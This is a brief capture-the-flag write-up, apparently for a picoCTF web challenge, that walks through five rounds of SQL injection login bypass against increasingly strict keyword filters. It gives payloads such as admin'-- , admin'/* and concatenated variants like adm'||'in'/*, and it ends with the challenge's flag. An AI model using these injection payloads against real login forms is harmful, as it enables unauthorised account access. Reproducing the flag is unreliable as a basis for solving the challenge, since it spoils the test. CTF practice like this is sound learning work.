Very new to SQL injections... So took some help from Chatgpt
ROUND 1 there was very simple filter on php page
only or was filtered 

on the input admin , 123 in bg I saw the command ##SELECT * FROM users WHERE username='admin ' AND password='123'
so I can use comments ... done with username = admin'-- and some random password


ROUND 2-
the filter is or and like = --
our first way of commenting was banned chat gpt suggest me some other way of commenting
username = admin'/*

ROUND 3-
the filter is or and = like > < --
but it didn't ban our comment method still lol
username = admin'/* still working

ROUND 4-
now this is tough .. or and = like > < -- admin
cant use admin to log in..
now we have to break admin with concatenation operator ||
username = adm'||'in'/*

ROUND 5-
now the filter is previous + union too
we can still bypass using this 
username = adm'||'in'/* , ad'||'min'/* , a'||'dmin'/*, admi'||'n'/*

got the flag // picoCTF{y0u_m4d3_1t_16f769e719ab9d3e310fd13dc1262ee1}



